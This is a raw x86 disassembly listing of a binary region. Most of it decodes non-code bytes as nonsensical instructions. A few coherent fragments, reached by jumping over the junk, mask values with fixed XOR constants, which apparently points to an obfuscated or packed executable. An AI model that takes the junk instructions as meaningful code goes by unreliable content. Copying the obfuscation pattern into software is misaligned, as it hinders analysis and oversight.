  420cca:	xlat   BYTE PTR ds:[ebx]
  420ccb:	sub    DWORD PTR [ebx-0x17],esi
  420cce:	mov    ch,0x66
  420cd0:	xchg   BYTE PTR [edx+0x4b78c016],al
  420cd6:	rcr    BYTE PTR [ebp-0x5c375400],0x46
  420cdd:	adc    DWORD PTR [esi],edi
  420cdf:	dec    edi
  420ce0:	inc    edx
  420ce1:	mov    ds:0x80090dd4,eax
  420ce6:	popf   
  420ce7:	leave  
  420ce8:	xchg   esp,edi
  420cea:	jecxz  0x420d1a
  420cec:	mov    ebx,0xa3a600f0
  420cf1:	scas   eax,DWORD PTR es:[edi]
  420cf2:	adc    BYTE PTR [ecx-0x3],ch
  420cf5:	mov    dh,0x20
  420cf7:	bsf    esi,esp
  420cfa:	fstp   DWORD PTR [ecx]
  420cfc:	add    eax,0x308a660a
  420d02:	aas    
  420d03:	psllw  mm6,QWORD PTR ds:0x97dde531
  420d0a:	adc    esi,eax
  420d0c:	mov    bh,0x71
  420d0e:	sub    al,0x77
  420d10:	loop   0x420d4e
  420d12:	sahf   
  420d13:	lea    esp,[esi+eiz*1]
  420d16:	in     eax,0x3
  420d18:	jae    0x420cd5
  420d1a:	sti    
  420d1b:	add    al,0x33
  420d1d:	xor    bh,BYTE PTR [edi+0x7d984e16]
  420d23:	dec    ebp
  420d24:	or     BYTE PTR [ebp+0x37],bh
  420d27:	cmp    BYTE PTR [ebp-0x5721e552],ah
  420d2d:	xchg   ebx,eax
  420d2e:	(bad)  
  420d2f:	dec    ebp
  420d30:	xor    eax,DWORD PTR ds:0xae4759f7
  420d36:	adc    DWORD PTR [ecx],ecx
  420d38:	jp     0x420ce6
  420d3a:	dec    edi
  420d3b:	scas   al,BYTE PTR es:[edi]
  420d3c:	(bad)  
  420d3e:	retf   
  420d3f:	adc    BYTE PTR [ebx+0x15],cl
  420d42:	addr16 cdq 
  420d44:	gs pop edx
  420d46:	or     al,0xbe
  420d48:	in     eax,dx
  420d49:	mov    cs,WORD PTR [ebx-0x6f4473c1]
  420d4f:	ror    BYTE PTR [ebp+esi*4+0x60],cl
  420d53:	jo     0x420d28
  420d55:	xchg   ebp,eax
  420d56:	clc    
  420d57:	xchg   edx,eax
  420d58:	call   0x71e9:0x1030dc30
  420d5f:	dec    ecx
  420d60:	mov    esp,0x688c8447
  420d65:	mov    dl,0xc
  420d67:	scas   eax,DWORD PTR es:[edi]
  420d68:	mov    ds:0xec36d76b,al
  420d6d:	adc    eax,0x74b6aae7
  420d72:	xlat   BYTE PTR ds:[ebx]
  420d73:	dec    esp
  420d74:	mov    cl,0xb4
  420d76:	js     0x420d08
  420d78:	aam    0xcd
  420d7a:	idiv   BYTE PTR [edi-0x776f10ec]
  420d80:	pop    ss
  420d81:	jae    0x420d62
  420d83:	jg     0x420d1b
  420d85:	(bad)  
  420d86:	cmp    eax,0x83d84285
  420d8b:	rcr    DWORD PTR [esi+0x69],cl
  420d8e:	mov    cl,0x7e
  420d90:	mov    gs,WORD PTR [eax+0x58]
  420d93:	div    DWORD PTR [esi-0x4cddab8]
  420d99:	add    al,0xe
  420d9b:	stc    
  420d9c:	test   DWORD PTR [esi+esi*4],esi
  420d9f:	ret    
  420da0:	add    al,0x2
  420da2:	push   0xa0808a93
  420da7:	stos   DWORD PTR es:[edi],eax
  420da8:	mov    ds:0x5ab5f53e,eax
  420dad:	add    al,0x77
  420daf:	jmp    0x935b69d4
  420db4:	inc    edi
  420db5:	cmp    ecx,ecx
  420db7:	sub    al,0xc2
  420db9:	out    0xcf,eax
  420dbb:	mov    bh,BYTE PTR [ecx]
  420dbd:	adc    esi,DWORD PTR [eax-0x4f]
  420dc0:	push   esi
  420dc1:	adc    ebx,DWORD PTR [esi]
  420dc3:	jg     0x420df0
  420dc5:	arpl   WORD PTR [edi+0x2f],cx
  420dc8:	fnstenv [edi+eax*1]
  420dcb:	icebp  
  420dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dcd:	test   eax,0x146dfa87
  420dd2:	push   ss
  420dd3:	push   DWORD PTR [edi]
  420dd5:	popa   
  420dd6:	sbb    al,0x9c
  420dd8:	jne    0x420e21
  420dda:	in     al,dx
  420ddb:	out    dx,eax
  420ddc:	pop    edx
  420ddd:	rcl    DWORD PTR [edx-0x4],1
  420de0:	push   edx
  420de1:	inc    eax
  420de2:	jmpw   0xd903
  420de6:	mov    dl,0x6a
  420de8:	fsub   QWORD PTR [eax]
  420dea:	xchg   edi,eax
  420deb:	test   al,bl
  420ded:	mov    al,0xb5
  420def:	stos   BYTE PTR es:[edi],al
  420df0:	sub    edx,DWORD PTR [ebx-0x24]
  420df3:	pop    edx
  420df4:	push   edx
  420df5:	pop    ebx
  420df6:	in     eax,0xfc
  420df8:	(bad)  
  420dfa:	fsub   QWORD PTR [ecx+0x24c7a1f9]
  420e00:	std    
  420e01:	fnsave [eax+eax*8-0x1d2f4b1c]
  420e08:	mul    DWORD PTR [ebp-0x232b972c]
  420e0e:	mov    dl,0xb
  420e10:	adc    ah,BYTE PTR [esi]
  420e12:	pop    ebx
  420e13:	pavgw  mm5,mm2
  420e16:	mov    ch,0xe9
  420e18:	mov    ebp,0x30899aed
  420e1d:	cdq    
  420e1e:	inc    esi
  420e1f:	jae    0x420e7d
  420e21:	shr    BYTE PTR [edi],0xb9
  420e24:	int    0x55
  420e26:	pop    eax
  420e27:	cmp    al,0x6b
  420e29:	(bad)  
  420e2a:	push   ecx
  420e2b:	sti    
  420e2c:	add    BYTE PTR [ebx],al
  420e2e:	push   esi
  420e2f:	fdivr  DWORD PTR [ebp-0x17d79bff]
  420e35:	and    al,0xa5
  420e37:	pop    ebp
  420e38:	jb     0x420e6c
  420e3a:	in     eax,dx
  420e3b:	rol    DWORD PTR [edi],cl
  420e3d:	je     0x420e6f
  420e3f:	popa   
  420e40:	test   DWORD PTR [esi-0x38],eax
  420e43:	mov    dl,0xe
  420e45:	retf   0x2e18
  420e48:	std    
  420e49:	retf   0x4e3b
  420e4c:	aaa    
  420e4d:	loopne 0x420e89
  420e4f:	push   eax
  420e50:	ins    DWORD PTR es:[edi],dx
  420e51:	loopne 0x420e89
  420e53:	test   DWORD PTR [edi],0xe4e3b40c
  420e59:	jmp    0x876bc060
  420e5e:	out    dx,eax
  420e5f:	cmp    eax,ebx
  420e61:	jno    0x420e33
  420e63:	push   esp
  420e64:	jae    0x420e71
  420e66:	iret   
  420e67:	int    0x4
  420e69:	enter  0x248a,0xa7
  420e6d:	outs   dx,DWORD PTR ds:[esi]
  420e6e:	mov    cl,0xc1
  420e70:	fucomip st,st(6)
  420e72:	sti    
  420e73:	add    BYTE PTR [edi+0x6f40ffb2],ch
  420e79:	fwait
  420e7a:	push   esp
  420e7b:	xor    BYTE PTR [ecx-0x3c],ch
  420e7e:	push   es
  420e7f:	mov    edx,0xa41cee34
  420e84:	nop
  420e85:	enter  0xa651,0x26
  420e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e8a:	mov    ebp,0xc6e4c97d
  420e8f:	pop    ebp
  420e90:	adc    DWORD PTR [esi],0xffffff9a
  420e93:	mov    ebx,0xd8684c79
  420e98:	ror    DWORD PTR [edi-0x754c1ac8],1
  420e9e:	sub    bh,BYTE PTR [edi+0x70]
  420ea1:	int    0x7b
  420ea3:	cmp    ah,BYTE PTR [esp+ebx*4]
  420ea6:	push   ebp
  420ea7:	mov    al,0xaf
  420ea9:	add    DWORD PTR [ebp+0x60],0xffffff87
  420ead:	pop    edx
  420eae:	and    al,0x33
  420eb0:	jo     0x420e67
  420eb2:	cmp    BYTE PTR [edi+edi*2],bh
  420eb5:	loopne 0x420e48
  420eb7:	(bad)  
  420eb8:	and    eax,0xfab36791
  420ebd:	add    ecx,DWORD PTR [eax-0x15ddc1]
  420ec3:	sub    DWORD PTR [ecx+eax*2],0x62ab27af
  420eca:	and    esi,DWORD PTR [eax]
  420ecc:	popf   
  420ecd:	jae    0x420ebd
  420ecf:	pop    ecx
  420ed0:	pop    esp
  420ed1:	or     DWORD PTR [eax+ebp*1-0x2a],edx
  420ed5:	outs   dx,DWORD PTR ds:[esi]
  420ed6:	not    DWORD PTR [edx]
  420ed8:	fwait
  420ed9:	xchg   esp,eax
  420eda:	xor    ah,BYTE PTR [edx]
  420edc:	jg     0x420ed0
  420ede:	leave  
  420edf:	sub    eax,DWORD PTR [edi+0x7c825b5c]
  420ee5:	xor    dl,bh
  420ee7:	xchg   edx,eax
  420ee8:	xchg   ebp,eax
  420ee9:	inc    ebx
  420eea:	cld    
  420eeb:	lock xchg ebx,eax
  420eed:	mov    edx,0x35a9a106
  420ef2:	retf   
  420ef3:	das    
  420ef4:	push   ebp
  420ef5:	push   ss
  420ef6:	add    ch,BYTE PTR [edi]
  420ef8:	mov    cl,0xb9
  420efa:	xchg   ebp,eax
  420efb:	pop    ecx
  420efc:	adc    BYTE PTR ss:[eax],0x12
  420f00:	and    edx,DWORD PTR [ecx+ebx*4+0x331834e5]
  420f07:	and    dl,bh
  420f09:	or     ah,BYTE PTR [esi+0xa]
  420f0c:	gs mov ecx,0xc44e2c8a
  420f12:	pop    ebx
  420f13:	jae    0x420f24
  420f15:	imul   edi,DWORD PTR [eax+0x4e9fead],0xfe11fb0f
  420f1f:	das    
  420f20:	ja     0x420f8e
  420f22:	sbb    al,0x3
  420f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f25:	mov    ah,0x8d
  420f27:	into   
  420f28:	xor    eax,0x12152444
  420f2d:	mov    edi,0x217c0d8e
  420f32:	mov    BYTE PTR [eax],bh
  420f34:	push   edx
  420f35:	cmp    ch,al
  420f37:	adc    edi,ecx
  420f39:	jbe    0x420fb1
  420f3b:	inc    eax
  420f3c:	aas    
  420f3d:	pop    ebp
  420f3e:	cmp    BYTE PTR [edi+0x6918e5d2],bl
  420f44:	xor    BYTE PTR [edi+0x5b],dh
  420f47:	pop    ss
  420f48:	or     BYTE PTR ds:0xc859025b,ch
  420f4e:	test   DWORD PTR [ecx+0x2c],ebp
  420f51:	sar    esi,1
  420f53:	test   al,0x32
  420f55:	jmp    0x420f7a
  420f57:	psllq  mm1,QWORD PTR [ebx-0x25]
  420f5b:	jo     0x420fae
  420f5d:	in     al,dx
  420f5e:	xchg   DWORD PTR [eax+ebx*4+0x50],ebp
  420f62:	repnz shl esp,1
  420f65:	dec    ecx
  420f66:	dec    ebp
  420f67:	inc    esp
  420f68:	push   ebx
  420f69:	lahf   
  420f6a:	rcl    ebx,cl
  420f6c:	cld    
  420f6d:	inc    ebp
  420f6e:	xlat   BYTE PTR ds:[ebx]
  420f6f:	popf   
  420f70:	cmp    ecx,DWORD PTR [eax+0x18]
  420f73:	je     0x4221de
  420f79:	mov    eax,DWORD PTR [ebp-0x144]
  420f7f:	mov    ecx,DWORD PTR [ebp-0x38]
  420f82:	mov    edx,DWORD PTR [ebp+0x8]
  420f85:	add    edx,DWORD PTR [ecx+eax*4]
  420f88:	mov    DWORD PTR [ebp-0x48],edx
  420f8b:	mov    eax,DWORD PTR [ebp-0x48]
  420f8e:	mov    DWORD PTR [ebp-0x210],eax
  420f94:	mov    eax,DWORD PTR [ebp+0xc]
  420f97:	mov    DWORD PTR [ebp-0x20c],eax
  420f9d:	mov    DWORD PTR [ebp-0x1f0],0xcb79b576
  420fa7:	mov    DWORD PTR [ebp-0x1ec],0x9c2b8ae8
  420fb1:	mov    DWORD PTR [ebp-0x1e0],0xcb79b572
  420fbb:	mov    DWORD PTR [ebp-0x1dc],0x9c2b8ae8
  420fc5:	lea    eax,[ebp-0x1e8]
  420fcb:	mov    DWORD PTR [ebp-0x1f4],eax
  420fd1:	mov    eax,DWORD PTR [ebp-0x20c]
  420fd7:	movzx  eax,WORD PTR [eax+0x20]
  420fdb:	xor    eax,0xa59b
  420fe0:	movzx  eax,ax
  420fe3:	sar    eax,1
  420fe5:	mov    ecx,DWORD PTR [ebp-0x20c]
  420feb:	movzx  ecx,WORD PTR [ecx+0x20]
  420fef:	xor    ecx,0xa59b
  420ff5:	movzx  ecx,cx
  420ff8:	shl    ecx,0xf
  420ffb:	or     eax,ecx
  420ffd:	movzx  eax,ax
  421000:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421006:	mov    DWORD PTR [ecx],eax
  421008:	mov    eax,DWORD PTR [ebp-0x1e0]
  42100e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421014:	xor    eax,0xcb79b576
  421019:	xor    edx,0x9c2b8ae8
  42101f:	mov    cl,0x2
  421021:	call   0x408bb8
  421026:	mov    ebx,eax
  421028:	mov    esi,edx
  42102a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421030:	mov    edx,DWORD PTR [ebp-0x1dc]
  421036:	xor    eax,0xcb79b576
  42103b:	jmp    0x421422
  421040:	xchg   ebp,eax
  421041:	or     ebp,DWORD PTR ds:0x9a3cb322
  421047:	mov    esp,0x90cf9e52
  42104c:	clc    
  42104d:	(bad)  
  42104e:	rcl    DWORD PTR [eax-0x413f4c6d],1
  421054:	dec    edx
  421055:	les    edi,FWORD PTR [esi+0x19d770be]
  42105b:	les    ebx,FWORD PTR ds:0xf6b1af3e
  421061:	mov    eax,0xd23c3a5d
  421066:	mov    ds:0xfb3eae12,eax
  42106b:	add    eax,0x31863185
  421070:	mov    ah,al
  421072:	inc    eax
  421073:	adc    al,0xd9
  421075:	and    BYTE PTR [edi+0x49ec1492],0xc
  42107c:	inc    edx
  42107d:	inc    ecx
  42107e:	fnstenv [esp+esi*1-0x75b6760d]
  421085:	xlat   BYTE PTR ds:[ebx]
  421086:	nop
  421087:	jno    0x4210d9
  421089:	inc    edx
  42108a:	xchg   esp,eax
  42108b:	pop    esi
  42108c:	lods   eax,DWORD PTR ds:[esi]
  42108d:	inc    edx
  42108e:	in     eax,0x1a
  421090:	sub    cl,bh
  421092:	pop    esp
  421093:	and    DWORD PTR [edi-0x56],0x35e28f0c
  42109a:	xchg   edx,eax
  42109b:	jbe    0x421059
  42109d:	in     al,dx
  42109e:	ret    
  42109f:	mov    edi,0x29721cb3
  4210a4:	(bad)  
  4210a5:	cmp    dh,BYTE PTR [ebx+0x61]
  4210a8:	mov    dl,0xa1
  4210aa:	cmp    DWORD PTR [ecx],eax
  4210ac:	mov    bl,0xa8
  4210ae:	xor    ah,0x65
  4210b1:	cwde   
  4210b2:	add    DWORD PTR gs:[eax-0x22],edx
  4210b6:	pop    ds
  4210b7:	jbe    0x421066
  4210b9:	sub    al,0x9e
  4210bb:	fs in  al,dx
  4210bd:	mov    BYTE PTR [esi],ch
  4210bf:	pop    es
  4210c0:	mov    ch,0xcf
  4210c2:	jg     0x421124
  4210c4:	dec    esp
  4210c5:	data16 out dx,al
  4210c7:	(bad)  
  4210c8:	cli    
  4210c9:	adc    al,bl
  4210cb:	ficomp DWORD PTR [eax-0x52d8d03d]
  4210d1:	jns    0x42109c
  4210d3:	jecxz  0x4210d5
  4210d5:	push   ds
  4210d6:	xchg   ebp,esp
  4210d8:	icebp  
  4210d9:	mov    edx,0x52a5217b
  4210de:	(bad)  
  4210df:	jmp    0x6029:0x65fadb7a
  4210e6:	out    dx,al
  4210e7:	ror    DWORD PTR [ebp-0x28],1
  4210ea:	xor    eax,0x3240ac2b
  4210ef:	or     eax,0x44d9d46a
  4210f4:	mov    edi,0xbed13c66
  4210f9:	or     eax,0xbfea29e8
  4210fe:	adc    DWORD PTR [edx+eax*1+0x4a5fa43],eax
  421105:	aam    0x89
  421107:	mov    esp,0xc9bfd6ef
  42110c:	and    BYTE PTR ds:0x6c058cf4,bl
  421112:	and    eax,0xf12ac11f
  421117:	xchg   esp,eax
  421118:	jmp    0x489c4bd5
  42111d:	repz mov edx,edx
  421120:	(bad)
  421123:	std    
  421124:	add    sp,WORD PTR [esi]
  421127:	inc    edx
  421128:	stos   BYTE PTR es:[edi],al
  421129:	and    esp,DWORD PTR [esi]
  42112b:	mov    ds,esi
  42112d:	icebp  
  42112e:	js     0x421137
  421130:	add    DWORD PTR [edi+0x3db8cbae],esi
  421136:	out    0x82,al
  421138:	(bad)  [esi+eiz*8+0x306c3939]
  42113f:	xchg   DWORD PTR [edx+0x3f],eax
  421142:	aad    0x44
  421144:	ret    0xc9f
  421147:	test   BYTE PTR [edi],al
  421149:	scas   eax,DWORD PTR es:[edi]
  42114a:	xor    ah,BYTE PTR [ebp+0x5d]
  42114d:	outs   dx,BYTE PTR ds:[esi]
  42114e:	inc    ecx
  42114f:	fwait
  421150:	es mov esi,0xd0bc2caf
  421156:	pop    es
  421157:	mov    ebx,0x1f84f5a8
  42115c:	cmp    eax,0xfec18b76
  421161:	mov    eax,ds:0x79bc8b21
  421166:	push   edi
  421167:	jns    0x4211d3
  421169:	popf   
  42116a:	clc    
  42116b:	dec    esp
  42116c:	pop    esi
  42116d:	xchg   ecx,eax
  42116e:	inc    ebp
  42116f:	(bad)  
  421170:	jbe    0x4211c6
  421172:	in     al,0x21
  421174:	nop
  421175:	ret    0x2a0a
  421178:	mov    cs,WORD PTR [eax+0x4c]
  42117b:	mov    DWORD PTR [esi],esp
  42117d:	jne    0x421140
  42117f:	mov    ds:0x16829052,eax
  421184:	or     al,0xf3
  421186:	in     eax,0xc6
  421188:	add    cl,dh
  42118a:	lods   eax,DWORD PTR ds:[esi]
  42118b:	jle    0x42117a
  42118d:	out    dx,eax
  42118e:	push   edx
  42118f:	test   eax,0x89be120f
  421194:	sbb    eax,0x747b6b5c
  421199:	dec    ecx
  42119a:	dec    ecx
  42119b:	pop    ecx
  42119c:	mov    eax,0x9c9fd021
  4211a1:	loope  0x4211b5
  4211a3:	jo     0x42116a
  4211a5:	xchg   ebx,eax
  4211a6:	jbe    0x4211c8
  4211a8:	sub    ecx,DWORD PTR [edi+edi*2+0x2d74c55e]
  4211af:	lock xlat BYTE PTR es:[ebx]
  4211b2:	cmp    cl,BYTE PTR [ebp-0x32fa88f6]
  4211b8:	test   al,0xdd
  4211ba:	xchg   DWORD PTR [ecx],esp
  4211bc:	push   eax
  4211bd:	mov    edi,0x9f2b5e03
  4211c2:	cli    
  4211c3:	lods   eax,DWORD PTR ds:[esi]
  4211c4:	das    
  4211c5:	pop    ds
  4211c6:	xchg   esi,eax
  4211c7:	xchg   DWORD PTR [ecx+0x7c],edi
  4211ca:	cli    
  4211cb:	rcr    DWORD PTR [esp+ebx*8-0x300857c4],cl
  4211d2:	ret    0x93a7
  4211d5:	in     eax,dx
  4211d6:	in     eax,dx
  4211d7:	mov    cl,0x8e
  4211d9:	mov    ecx,0xa36d8679
  4211de:	push   ecx
  4211df:	mov    fs,ebp
  4211e1:	sbb    ebp,DWORD PTR [ecx+0x590dd8ef]
  4211e7:	sub    ebp,DWORD PTR [edx-0x2ab7d0cb]
  4211ed:	jmp    0x29960170
  4211f2:	inc    ecx
  4211f3:	aaa    
  4211f4:	mov    DWORD PTR [esi],edi
  4211f6:	retf   
  4211f7:	nop
  4211f8:	scas   eax,DWORD PTR es:[edi]
  4211f9:	fisubr DWORD PTR fs:[edx-0x1b]
  4211fd:	jl     0x421270
  4211ff:	jne    0x4211a4
  421201:	call   DWORD PTR [esi+0x2b]
  421204:	cwde   
  421205:	hlt    
  421206:	dec    ecx
  421207:	sar    cl,cl
  421209:	scas   al,BYTE PTR es:[edi]
  42120a:	mov    edx,?
  42120c:	or     al,0xaa
  42120e:	xchg   BYTE PTR [ebx+0x61],bh
  421211:	out    dx,al
  421212:	or     ebx,esp
  421214:	mov    ?,WORD PTR [edx+0x2893ed0c]
  42121a:	arpl   WORD PTR [ebx+0x385e3048],si
  421220:	iret   
  421221:	cmp    BYTE PTR [eax-0x365a3bdf],dl
  421227:	imul   edi,DWORD PTR [ebx],0xffffffa1
  42122a:	add    edx,esi
  42122c:	push   ebp
  42122d:	xchg   esp,eax
  42122e:	and    eax,0x43a8c80c
  421233:	pop    eax
  421234:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421235:	mov    BYTE PTR ds:0xae1dfd51,ah
  42123b:	mov    esp,gs
  42123d:	loop   0x421277
  42123f:	inc    ecx
  421240:	call   0x57a50da7
  421245:	fst    st(5)
  421247:	out    dx,al
  421248:	xchg   cl,ah
  42124a:	xor    dl,BYTE PTR [edx-0x59799af0]
  421250:	mov    ch,0x62
  421252:	cli    
  421253:	push   ecx
  421254:	push   ss
  421255:	dec    edi
  421256:	sub    al,0xba
  421258:	test   DWORD PTR [eax+0x20],ebp
  42125b:	mov    DWORD PTR [ecx],0xd97522d1
  421261:	xchg   ebx,eax
  421262:	enter  0x6eff,0xcf
  421266:	scas   al,BYTE PTR es:[edi]
  421267:	xor    BYTE PTR [esi-0x7f],al
  42126a:	fsub   st,st(0)
  42126c:	push   ebp
  42126d:	mov    ecx,0x80176274
  421272:	xor    cl,BYTE PTR [edx]
  421274:	inc    ebp
  421275:	pop    ecx
  421276:	fidiv  WORD PTR [eax]
  421278:	cli    
  421279:	xor    al,0x49
  42127b:	xchg   ecx,eax
  42127c:	out    0x22,eax
  42127e:	add    al,0xcb
  421280:	js     0x421235
  421282:	pop    eax
  421283:	jmp    0x12946dfa
  421288:	(bad)  
  421289:	mov    bl,0x27
  42128b:	or     bl,ch
  42128d:	pop    ebx
  42128e:	dec    esp
  42128f:	enter  0xb0fd,0x94
  421293:	mov    ch,BYTE PTR [eax]
  421295:	mov    bl,0xb3
  421297:	adc    al,0xd
  421299:	add    ah,dl
  42129b:	jmp    0x42124d
  42129d:	sub    BYTE PTR [eax],0x8e
  4212a0:	cwde   
  4212a1:	jns    0x421313
  4212a3:	dec    ecx
  4212a4:	idiv   DWORD PTR [esi+0x49]
  4212a7:	aaa    
  4212a8:	cmp    BYTE PTR [ebx+edx*4],dl
  4212ab:	test   DWORD PTR [esi+0x7b],0xcb745b42
  4212b2:	xor    edi,DWORD PTR [edx+0x15f56d81]
  4212b8:	jne    0x42127a
  4212ba:	(bad)  
  4212bb:	out    0x68,eax
  4212bd:	xor    eax,0x752fcb27
  4212c2:	popa   
  4212c3:	dec    ecx
  4212c4:	cmp    al,BYTE PTR [esi]
  4212c6:	mov    ecx,0x73b4d8e6
  4212cb:	call   0x6b711181
  4212d0:	mov    DWORD PTR [ecx],eax
  4212d2:	lods   al,BYTE PTR ds:[esi]
  4212d3:	add    ecx,DWORD PTR [edx]
  4212d5:	mov    dl,0x1b
  4212d7:	sub    eax,0x5704d193
  4212dc:	adc    BYTE PTR [ebp+0x46cbe4d6],dl
  4212e2:	mov    ch,0xde
  4212e4:	push   edi
  4212e5:	sbb    BYTE PTR [eax+0x1b],bh
  4212e8:	fchs   
  4212ea:	stc    
  4212eb:	jg     0x421316
  4212ed:	push   esi
  4212ee:	or     edx,edi
  4212f0:	in     al,dx
  4212f1:	push   eax
  4212f2:	or     eax,0xa887f46d
  4212f7:	fsub   DWORD PTR [edi-0x9b503a2]
  4212fd:	mov    edi,0xc2a66ba4
  421302:	push   0x36
  421304:	sbb    cl,BYTE PTR [ecx+0x78]
  421307:	mov    WORD PTR ds:0x374005b1,fs
  42130d:	fisttp WORD PTR [ebx]
  42130f:	dec    ecx
  421310:	neg    DWORD PTR [eax+0x5488c8a8]
  421316:	mov    esi,0xb04e07de
  42131b:	aas    
  42131c:	arpl   WORD PTR [ecx+0x73],cx
  42131f:	add    eax,0x6b15d0ca
  421324:	ins    DWORD PTR es:[edi],dx
  421325:	sbb    dh,BYTE PTR [eax]
  421327:	adc    eax,0x3bb0b218
  42132c:	mov    ebp,0x4616dbb5
  421331:	xchg   ecx,eax
  421332:	lds    edx,FWORD PTR [edi-0x5e]
  421335:	mov    dl,BYTE PTR [edi-0x50]
  421338:	fidiv  WORD PTR [eax-0x30357ece]
  42133e:	xor    DWORD PTR ds:[edx-0x6],esi
  421342:	fimul  WORD PTR [ebx+0x60]
  421345:	push   cs
  421346:	jle    0x42134e
  421348:	(bad)  
  421349:	outs   dx,BYTE PTR ds:[esi]
  42134a:	(bad)  
  42134b:	clc    
  42134c:	push   edx
  42134d:	mov    DWORD PTR gs:[eax],ebx
  421350:	xchg   edi,eax
  421351:	loop   0x42137e
  421353:	cmp    eax,0xaecca586
  421358:	inc    eax
  421359:	std    
  42135a:	xchg   ebp,eax
  42135b:	dec    ebp
  42135c:	mov    ebp,0x3bfec113
  421361:	xchg   esp,eax
  421362:	test   al,0x78
  421364:	xchg   edx,eax
  421365:	xor    DWORD PTR [ebp+0x69d29712],0x79
  42136c:	rcl    DWORD PTR [ecx],0x2a
  42136f:	in     al,0x8
  421371:	fild   QWORD PTR [edx+0x4cea13b]
  421377:	popf   
  421378:	jge    0x421384
  42137a:	cmp    al,0x50
  42137c:	outs   dx,BYTE PTR ss:[esi]
  42137e:	sub    al,0xce
  421380:	stc    
  421381:	sahf   
  421382:	push   ebp
  421383:	xchg   ebx,edi
  421385:	xor    DWORD PTR [edx],edi
  421387:	scas   al,BYTE PTR es:[edi]
  421388:	or     dl,BYTE PTR [esi-0x40]
  42138b:	es or  al,0x4c
  42138e:	adc    BYTE PTR [esi],dl
  421390:	add    bh,bl
  421392:	push   edx
  421393:	jmp    0x8632:0x9cdefb67
  42139a:	(bad)  
  42139c:	retf   0xc034
  42139f:	or     eax,0x14b4d4c7
  4213a4:	std    
  4213a5:	rol    DWORD PTR [eax],cl
  4213a7:	inc    eax
  4213a8:	inc    ebx
  4213a9:	daa    
  4213aa:	mov    eax,ds:0xf34b2f63
  4213af:	dec    esp
  4213b0:	push   ebp
  4213b2:	cmp    bh,BYTE PTR [edi-0x5a]
  4213b5:	xchg   esi,eax
  4213b6:	mov    dh,0xa6
  4213b8:	mov    cl,0x6a
  4213ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213bb:	mov    ebx,0x4785a768
  4213c0:	sub    eax,0x55872a57
  4213c5:	sub    DWORD PTR [edi+0x30],ebx
  4213c8:	jg     0x421419
  4213ca:	xchg   esp,eax
  4213cb:	xor    al,0x4e
  4213cd:	push   es
  4213ce:	lods   al,BYTE PTR ds:[esi]
  4213cf:	(bad)  
  4213d0:	fsub   DWORD PTR [edx]
  4213d2:	adc    DWORD PTR [edi],ebx
  4213d4:	sar    BYTE PTR [eax],1
  4213d6:	out    0x7a,al
  4213d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213d9:	ret    0xa097
  4213dc:	cmp    cl,0x28
  4213df:	daa    
  4213e0:	and    eax,0xf44ee509
  4213e5:	add    DWORD PTR [ebx-0x28adbf10],ebp
  4213eb:	leave  
  4213ec:	dec    ebp
  4213ed:	adc    bl,dl
  4213ef:	pop    es
  4213f0:	xchg   esi,eax
  4213f1:	ja     0x42138c
  4213f3:	jmp    0xb8a8c87c
  4213f8:	mov    cl,0x8e
  4213fa:	mov    bl,0xaf
  4213fc:	pop    ebp
  4213fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213fe:	ins    BYTE PTR es:[edi],dx
  4213ff:	jo     0x42141f
  421401:	fbstp  TBYTE PTR [edx+0x60]
  421404:	inc    eax
  421405:	dec    eax
  421406:	inc    ebx
  421407:	adc    ah,BYTE PTR [edi+0x6f]
  42140a:	pop    eax
  42140b:	dec    eax
  42140c:	pop    ebp
  42140d:	aaa    
  42140e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42140f:	ins    DWORD PTR es:[edi],dx
  421410:	and    bh,BYTE PTR [edx-0x45]
  421413:	adc    eax,0xea97a53
  421418:	jp     0x4213dc
  42141a:	sbb    esp,edi
  42141c:	xor    dl,BYTE PTR [esi+eiz*8+0x65]
  421420:	outs   dx,BYTE PTR ds:[esi]
  421421:	jno    0x2bccfd19
  421427:	pushf  
  421428:	mov    cl,0x3e
  42142a:	call   0x42241b
  42142f:	or     ebx,eax
  421431:	or     esi,edx
  421433:	movzx  eax,bl
  421436:	push   eax
  421437:	lea    eax,[ebp-0x198]
  42143d:	push   eax
  42143e:	call   0x415a09
  421443:	mov    eax,DWORD PTR [ebp-0x1f0]
  421449:	mov    edx,DWORD PTR [ebp-0x1ec]
  42144f:	xor    eax,0xcb79b576
  421454:	xor    edx,0x9c2b8ae8
  42145a:	mov    cl,0x2
  42145c:	call   0x408bb8
  421461:	mov    esi,eax
  421463:	mov    edi,edx
  421465:	mov    eax,DWORD PTR [ebp-0x1f0]
  42146b:	jmp    0x421852
  421470:	out    0xc8,eax
  421472:	push   esi
  421473:	sub    esi,DWORD PTR [esi-0x44]
  421476:	mov    esp,0xfcb5630c
  42147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42147c:	pop    ss
  42147d:	xchg   edx,eax
  42147e:	add    al,0xdd
  421480:	pop    ds
  421481:	mov    ebx,0xc44abec0
  421486:	mov    esi,0xcf2bedbe
  42148b:	mov    WORD PTR [ecx+0x360bab1c],cs
  421491:	mov    ebp,0xb07ad093
  421496:	out    0x64,eax
  421498:	in     al,0xa4
  42149a:	adc    al,0xa3
  42149c:	(bad)  
  42149d:	aaa    
  42149e:	adc    esi,DWORD PTR [esi-0x69]
  4214a1:	jge    0x4214e7
  4214a3:	das    
  4214a4:	jns    0x4214b0
  4214a6:	out    0xca,al
  4214a8:	dec    eax
  4214a9:	mov    al,0x85
  4214ab:	cld    
  4214ac:	cmp    eax,0x79737d22
  4214b1:	xor    edx,DWORD PTR [esi]
  4214b3:	mov    cl,0x8e
  4214b5:	mov    eax,0x3fe9e45f
  4214ba:	lds    eax,FWORD PTR [ebp+0x5]
  4214bd:	jmp    0x6d0d:0x3ec5f091
  4214c4:	jmp    0x4214bc
  4214c6:	(bad)  
  4214c7:	mov    es,esp
  4214c9:	xlat   BYTE PTR ds:[ebx]
  4214ca:	mov    esi,0x7b662299
  4214cf:	cmp    DWORD PTR [edx+0x26112553],ebp
